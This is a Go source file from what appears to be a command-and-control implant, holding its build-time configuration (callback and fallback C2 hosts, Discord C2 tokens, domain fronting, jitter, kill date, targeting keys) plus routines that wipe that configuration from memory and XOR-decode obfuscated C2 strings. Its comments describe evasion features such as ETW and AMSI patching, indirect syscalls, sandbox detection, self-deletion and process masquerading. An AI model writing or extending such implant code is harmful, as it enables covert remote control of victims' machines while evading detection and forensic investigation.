package main

import "encoding/base64"

// Build-time variables populated by the Go linker (-ldflags -X).
// After startup, values are copied into agent/profile structs and these
// globals are zeroed by clearGlobals() to reduce memory forensics exposure.
var (
	payloadUUID    string = ""
	callbackHost   string = ""
	callbackPort   string = "443"
	userAgent      string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
	userAgentPool  string = "" // Newline-separated pool of User-Agent strings for rotation
	sleepInterval  string = "10"
	jitter         string = "10"
	encryptionKey  string = ""
	killDate       string = "0"
	httpTimeout    string = "30"
	maxRetries     string = "10"
	debug          string = "false"
	getURI         string = "/data"
	postURI        string = "/data"
	hostHeader     string = ""     // Override Host header for domain fronting
	proxyURL       string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
	tlsVerify      string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
	tlsFingerprint string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
	fallbackHosts  string = ""     // Comma-separated fallback C2 URLs for automatic failover
	contentTypes   string = ""     // Comma-separated Content-Type values for request rotation
	// bodyTransforms removed: use httpx C2 profile for malleable transforms
	workingHoursStart      string = "" // Working hours start (HH:MM, 24hr local time)
	workingHoursEnd        string = "" // Working hours end (HH:MM, 24hr local time)
	workingDays            string = "" // Active days (1-7, Mon=1, Sun=7, comma-separated)
	tcpBindAddress         string = "" // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
	envKeyHostname         string = "" // Environment key: hostname must match this regex
	envKeyDomain           string = "" // Environment key: domain must match this regex
	envKeyUsername         string = "" // Environment key: username must match this regex
	envKeyProcess          string = "" // Environment key: this process must be running
	selfDelete             string = "" // Self-delete binary from disk after execution starts
	masqueradeName         string = "" // Process name masquerade (Linux: prctl PR_SET_NAME)
	customHeaders          string = "" // Base64-encoded JSON of additional HTTP headers
	autoPatch              string = "" // Auto-patch ETW and AMSI at startup (Windows only)
	blockDLLs              string = "" // Block non-Microsoft DLLs in child processes (Windows only)
	indirectSyscalls       string = "" // Enable indirect syscalls at startup (Windows only)
	xorKey                 string = "" // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
	sandboxGuard           string = "" // Detect sleep skipping (sandbox fast-forward) and exit silently
	sleepMask              string = "" // Encrypt sensitive agent/C2 data in memory during sleep cycles
	sleepGuardPages        string = "" // VirtualProtect PAGE_NOACCESS on vault pages during sleep (Windows only)
	discordBotToken        string = "" // Discord bot token for Discord C2 profile
	discordChannelID       string = "" // Discord channel ID for Discord C2 profile
	discordPollDelay       string = "" // Seconds between Discord message polls (default: 10)
	discordPollChecks      string = "" // Max polling attempts per exchange (default: 10)
	httpxConfig            string = "" // Base64-encoded httpx agent config JSON (transforms, URIs, headers)
	httpxDomains           string = "" // Comma-separated httpx callback domains
	httpxRotation          string = "" // httpx domain rotation: fail-over, round-robin, random
	httpxFailoverThreshold string = "" // httpx failover threshold (consecutive failures before switching)
)

// clearGlobals zeros out ALL build-time global variables after they have been
// copied into the agent/profile structs. This prevents sensitive config
// data (encryption keys, C2 URLs, UUIDs, operational parameters) from
// lingering in the binary's data segment where memory forensics tools
// (Volatility, WinDbg) could extract them.
func clearGlobals() {
	// C2 connection config
	payloadUUID = ""
	callbackHost = ""
	callbackPort = ""
	userAgent = ""
	userAgentPool = ""
	encryptionKey = ""
	getURI = ""
	postURI = ""
	hostHeader = ""
	proxyURL = ""
	customHeaders = ""
	xorKey = ""
	tlsVerify = ""
	tlsFingerprint = ""
	fallbackHosts = ""
	contentTypes = ""
	tcpBindAddress = ""
	discordBotToken = ""
	discordChannelID = ""
	discordPollDelay = ""
	discordPollChecks = ""
	httpxConfig = ""
	httpxDomains = ""
	httpxRotation = ""
	httpxFailoverThreshold = ""

	// Operational parameters
	sleepInterval = ""
	jitter = ""
	killDate = ""
	httpTimeout = ""
	maxRetries = ""
	debug = ""
	workingHoursStart = ""
	workingHoursEnd = ""
	workingDays = ""

	// Environment keys (reveal targeting criteria)
	envKeyHostname = ""
	envKeyDomain = ""
	envKeyUsername = ""
	envKeyProcess = ""

	// OPSEC feature flags (reveal agent capabilities)
	selfDelete = ""
	masqueradeName = ""
	autoPatch = ""
	blockDLLs = ""
	indirectSyscalls = ""
	sandboxGuard = ""
	sleepMask = ""
}

// xorDecodeString decodes a base64-encoded XOR-encrypted string.
// If the input is empty or decoding fails, returns the original string.
func xorDecodeString(encoded string, key []byte) string {
	if encoded == "" || len(key) == 0 {
		return encoded
	}
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded // not encoded, use as-is
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return string(result)
}

// zeroBytes overwrites a byte slice with zeros to clear sensitive data from memory.
func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}
